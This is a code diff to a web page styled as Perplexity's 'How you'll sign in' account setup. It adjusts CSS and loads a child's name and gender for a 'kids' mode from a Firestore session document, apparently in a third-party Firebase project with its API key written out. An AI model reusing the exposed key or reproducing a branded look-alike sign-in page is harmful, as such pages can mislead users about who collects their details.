@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Perplexity - How you’ll sign in</title>
     <style>
-        /* CSS Variables for Real-Time Theme Switching */
+        /* CSS Variables for Real-time Theme Switching */
         :root {
             --bg-color: #ffffff;
             --text-color: #000000;
@@ -15,22 +15,18 @@
             --label-bg: #ffffff;
             --btn-bg: #000000;
             --btn-text: #ffffff;
-            --domain-text: #8e8e93;
-            --error-text: #d93025;
         }
 
         @media (prefers-color-scheme: dark) {
             :root {
-                --bg-color: #121212;
+                --bg-color: #1c1c1e;
                 --text-color: #ffffff;
-                --sub-text-color: #a1a1aa;
-                --input-border: #3f3f46;
-                --input-bg: #121212;
-                --label-bg: #121212;
+                --sub-text-color: #98989d;
+                --input-border: #48484a;
+                --input-bg: #1c1c1e;
+                --label-bg: #1c1c1e;
                 --btn-bg: #ffffff;
                 --btn-text: #000000;
-                --domain-text: #71717a;
-                --error-text: #ef4444;
             }
         }
 
@@ -45,7 +41,7 @@
             padding: 40px 20px;
             background-color: var(--bg-color);
             color: var(--text-color);
-            transition: background-color 0.3s ease, color 0.3s ease;
+            transition: background-color 0.3s, color 0.3s;
         }
 
         .container {
@@ -82,19 +78,17 @@
             font-size: 12px;
             color: var(--sub-text-color);
             z-index: 1;
-            transition: background-color 0.3s ease;
         }
 
         .input-wrapper {
             display: flex;
             align-items: center;
             border: 1px solid var(--input-border);
-            border-radius: 24px; /* Increased radius */
+            border-radius: 24px; /* Increased Radius */
             padding: 12px 16px;
             height: 56px;
             box-sizing: border-box;
             background: var(--input-bg);
-            transition: border-color 0.2s ease, background-color 0.3s ease;
         }
 
         .input-wrapper:focus-within {
@@ -112,7 +106,7 @@
         }
 
         .domain-suffix {
-            color: var(--domain-text);
+            color: var(--sub-text-color);
             font-size: 17px;
             margin-left: 4px;
             white-space: nowrap;
@@ -123,16 +117,16 @@
             color: var(--sub-text-color);
             text-align: left;
             margin-top: 8px;
-            margin-left: 5px;
+            margin-left: 10px;
         }
 
         .error-message {
-            color: var(--error-text);
+            color: #d93025;
             font-size: 14px;
             margin-top: 8px;
             display: none;
             text-align: left;
-            margin-left: 5px;
+            margin-left: 10px;
         }
 
         .next-btn {
@@ -140,13 +134,13 @@
             background-color: var(--btn-bg);
             color: var(--btn-text);
             border: none;
-            border-radius: 40px; /* Increased radius */
+            border-radius: 40px; /* Increased Radius */
             padding: 16px;
             font-size: 18px;
             font-weight: 500;
             margin-top: 30px;
             cursor: pointer;
-            transition: opacity 0.2s, background-color 0.3s ease, color 0.3s ease;
+            transition: opacity 0.2s;
         }
 
         .next-btn:disabled {
@@ -158,8 +152,8 @@
 <body>
 
     <div class="container">
-        <h1 id="pageTitle">How you’ll sign in</h1>
-        <p class="sub-text" id="subText">Create a email address for signing in to your Perplexity Account</p>
+        <h1 id="pageHeading">How you’ll sign in</h1>
+        <p id="pageSubText" class="sub-text">Create a email address for signing in to your Perplexity Account</p>
 
         <div class="input-group">
             <label>Username</label>
@@ -175,8 +169,9 @@
     </div>
 
     <script type="module">
+        // Imported getDoc to read the single user file for the Kids feature
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, doc, updateDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+        import { getFirestore, doc, updateDoc, collection, query, where, getDocs, getDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
@@ -196,36 +191,57 @@
         const nextBtn = document.getElementById('nextBtn');
         const errorMsg = document.getElementById('errorMsg');
         const instructionText = document.getElementById('instruction');
-        const pageTitle = document.getElementById('pageTitle');
-        const subText = document.getElementById('subText');
+        const pageHeading = document.getElementById('pageHeading');
+        const pageSubText = document.getElementById('pageSubText');
 
-        // URL Parameter handling
         const urlParams = new URLSearchParams(window.location.search);
         const sessionId = urlParams.get('session');
         const typeParam = urlParams.get('type');
-        const nameParam = urlParams.get('name');
-        const genderParam = urlParams.get('gender');
+        const genderParam = urlParams.get('gender'); // Optional: check URL for gender
 
-        // If 'type=kids' is present, update the UI dynamically
-        if (typeParam === 'kids') {
-            const childName = nameParam ? nameParam.charAt(0).toUpperCase() + nameParam.slice(1) : "Your child";
-            pageTitle.innerText = `Choose how ${childName} will sign in`;
+        // 1. Fetch User Data to configure the "Kids" display format
+        async function loadKidsUI() {
+            if (!sessionId) return;
 
-            let pronounSubject = "They";
-            let pronounPossessive = "their";
+            try {
+                const docRef = doc(db, "ASPX Keys", sessionId);
+                const docSnap = await getDoc(docRef);
 
-            if (genderParam && genderParam.toLowerCase() === 'male') {
-                pronounSubject = "He";
-                pronounPossessive = "his";
-            } else if (genderParam && genderParam.toLowerCase() === 'female') {
-                pronounSubject = "She";
-                pronounPossessive = "her";
+                if (docSnap.exists()) {
+                    const data = docSnap.data();
+                    const firstName = data.firstName || "the user";
+                    const isKids = typeParam === 'kids' || data.type === 'kids';
+                    const gender = (genderParam || data.gender || "other").toLowerCase();
+
+                    if (isKids) {
+                        // Change heading
+                        pageHeading.innerText = `Choose how ${firstName} will sign in`;
+
+                        // Evaluate pronouns
+                        let subjectPronoun = "They";
+                        let possessivePronoun = "their";
+
+                        if (gender === 'male' || gender === 'm') {
+                            subjectPronoun = "He";
+                            possessivePronoun = "his";
+                        } else if (gender === 'female' || gender === 'f') {
+                            subjectPronoun = "She";
+                            possessivePronoun = "her";
+                        }
+
+                        // Change Subtext
+                        pageSubText.innerText = `${subjectPronoun} will use this email to sign in to ${possessivePronoun} Perplexity Account`;
+                    }
+                }
+            } catch (error) {
+                console.error("Error fetching session data:", error);
             }
-
-            subText.innerText = `${pronounSubject} will use this email to sign in to ${pronounPossessive} Perplexity Account`;
         }
+        
+        // Execute UI check on load
+        loadKidsUI();
 
-        // Logic for handling the "Next" action
+        // 2. Logic for handling the "Next" action
         async function handleNext() {
             const username = usernameInput.value.trim();
             if (!username) return;
@@ -270,10 +286,11 @@
             }
         }
 
-        // restrict input characters: Only A-Z, a-z, 0-9, and period (.) allowed
+        // 3. Restrict input characters (A-Z, a-z, 0-9, .)
         usernameInput.addEventListener('input', (e) => {
             const val = e.target.value;
-            const cleanVal = val.replace(/[^a-zA-Z0-9.]/g, ''); // Enforces strict character limit
+            // The Regex allows uppercase & lowercase letters, numbers, and periods
+            const cleanVal = val.replace(/[^a-zA-Z0-9.]/g, '');
             usernameInput.value = cleanVal;
             errorMsg.style.display = 'none';
             instructionText.style.display = 'block';
